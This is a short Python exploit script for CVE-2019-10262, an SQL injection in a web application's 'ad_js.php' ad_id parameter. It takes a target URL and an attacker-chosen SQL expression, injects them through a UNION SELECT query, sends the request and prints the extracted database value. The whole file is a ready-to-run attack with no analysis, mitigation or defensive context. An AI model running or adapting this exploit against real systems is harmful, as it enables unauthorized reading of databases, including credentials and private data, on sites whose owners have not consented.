# coding:utf-8
# CVE-2019-10262
import requests
import sys
import re

url = sys.argv[1]
sql = sys.argv[2]
print("[*]target:{}".format(url))
payload = url + 'ad_js.php?ad_id=1 union select 1,2,3,4,5,6,{}'.format(sql)
print("[*]payload:{}".format(payload))
try:
    res = requests.get(payload);
    if res.status_code == 200:
        print("-------------response start---------------")
        print("")
        print(re.findall('(".*?")', res.text)[0].strip("\""))
        print("")
        print("-------------response end-----------------")
except Exception as err:
    print("[-]{}".format(err))
